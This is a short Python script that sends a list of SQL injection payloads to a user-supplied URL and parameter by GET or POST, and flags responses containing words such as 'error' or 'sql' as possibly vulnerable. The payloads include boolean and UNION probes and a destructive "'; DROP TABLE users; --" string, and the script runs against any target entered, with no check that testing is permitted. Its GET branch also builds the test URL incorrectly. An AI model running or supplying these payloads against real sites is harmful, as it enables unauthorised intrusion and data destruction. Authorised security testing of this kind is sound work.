import requests
from urllib.parse import urljoin

# List of common SQL injection payloads
sql_injection_payloads = [
    "' OR 1=1 --",         # Classic boolean-based SQLi
    "' OR 'a'='a' --",     # String-based SQLi
    "'; DROP TABLE users; --",  # Malicious payload to drop a table
    "' UNION SELECT null, null, null --", # Union-based SQLi
    "' AND 1=2 --",        # Another boolean-based SQLi
]

def test_sql_injection(url, param=None, method='GET'):

    # Test each SQL injection payload
    for payload in sql_injection_payloads:
        if method.upper() == 'GET':
            # Test by adding the payload to the URL (query parameters)
            test_url = urljoin(url, f"{param}={payload}")
            response = requests.get(test_url)
        elif method.upper() == 'POST':
            # Test by injecting the payload into a form field via POST request
            data = {param: payload}
            response = requests.post(url, data=data)
        else:
            print(f"Unsupported HTTP method: {method}")
            return
        
        # Check if the response contains SQL error messages or unexpected behavior
        if "error" in response.text.lower() or "sql" in response.text.lower() or "warning" in response.text.lower():
            print(f"[+] Potential SQL injection vulnerability found with payload: {payload}")
            print(f"    Response contains SQL error or unexpected message")
            print(f"    Test URL: {response.url}")
        else:
            print(f"[-] No SQL injection vulnerability found with payload: {payload}")
# Example usage
if __name__ == "__main__":
    # Target web application URL
    target_url = input("Enter the URL of the web application to test: ").strip()

    # Optionally specify the parameter name to inject into (e.g., 'username', 'search')
    param = input("Enter the parameter to inject into (e.g., 'username', 'search'): ").strip()

    # HTTP method to use for the test (GET or POST)
    method = input("Enter HTTP method (GET/POST): ").strip()

    # Run SQL injection test
    test_sql_injection(target_url, param, method)